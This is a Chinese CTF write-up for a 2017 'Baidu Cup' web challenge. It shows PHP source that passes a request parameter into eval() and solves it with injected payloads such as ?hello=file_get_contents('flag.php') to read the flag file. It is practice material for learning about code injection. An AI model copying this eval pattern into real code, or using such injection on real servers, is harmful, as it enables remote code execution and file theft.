---
title: “百度杯”CTF比赛 2017 二月场--web 爆破-2 writeup
date: 2019-06-14 15:19:26
tags: CTF WEB
categories: CTF做题记录
---

# 题目描述
![在这里插入图片描述](https://img-blog.csdnimg.cn/2019061415042264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
<!--more-->
## 解题思路
点击链接得到以下代码：
```php
<?php
include "flag.php";
$a = @$_REQUEST['hello'];
eval( "var_dump($a);");
show_source(__FILE__);
```

 1. 尝试将hello变为全局变量（GOLBALS）
		在URL后加`?hello=$GOLBALS`
		结果：
		![在这里插入图片描述](https://img-blog.csdnimg.cn/20190614150719103.png)
## 得到FLAG
 2. 由第一步可知，flag不在变量中
 	  猜测flag在文件中，使用file_get_contents() 函数，其作用为把整个文件读入一个`字符串`中。
 	  `URL?hello=file_get_contents('flag.php') `右键源码得到flag
 	  ![在这里插入图片描述](https://img-blog.csdnimg.cn/2019061415110926.png)
 3. 也可在URL后直接加`?hello=file('flag.php')`
   		file() 函数把整个文件读入一个`数组`中![在这里插入图片描述](https://img-blog.csdnimg.cn/20190614151322121.png)
 	  

